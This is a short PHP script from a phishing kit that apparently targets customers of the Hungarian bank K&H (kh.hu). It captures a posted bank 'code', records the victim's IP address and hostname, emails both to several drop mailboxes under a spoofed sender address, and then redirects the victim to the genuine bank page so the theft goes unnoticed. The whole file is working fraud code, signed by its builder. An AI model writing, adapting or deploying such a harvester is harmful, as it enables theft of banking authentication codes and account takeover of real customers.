<?
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$msg .= "\n";
$msg .= "CODE : ".$_POST['code']."\n";
$msg .= "\n";
$msg .= "IP: ".$ip."\n";
$msg .= "HostName : ".$hostname."\n";
$msg .= "\n";
$msg .= "------------Built By HustleLogic----------------\n";
$post = "logshy0147@gmail.com,logshu7@outlook.com,koch@salesperson.net";
$subj = "KH Code - ".$_POST['code']."\n";
$from = "From: $ip<swipe@kh.hu>";
mail("$post",$subj, $msg, $from); 
header("Location: https://www.kh.hu/bank");  	  

?>
